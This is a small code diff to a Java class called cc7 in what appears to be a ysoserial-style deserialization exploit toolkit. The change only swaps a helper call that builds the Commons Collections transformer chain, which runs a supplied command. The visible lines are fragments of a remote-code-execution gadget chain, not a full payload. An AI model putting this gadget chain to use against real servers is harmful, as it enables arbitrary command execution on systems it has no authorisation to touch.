@@ -3,7 +3,7 @@ package com.qi4l.JYso.gadgets;
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Reflections;
-import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.map.LazyMap;
@@ -24,7 +24,7 @@ public class cc7 implements ObjectPayload<Hashtable> {
 
         final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
-        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+        final Transformer[] transformers = com.qi4l.JYso.gadgets.utils.Utils.makeTransformer(command);
 
         Map innerMap1 = new HashMap();
         Map innerMap2 = new HashMap();
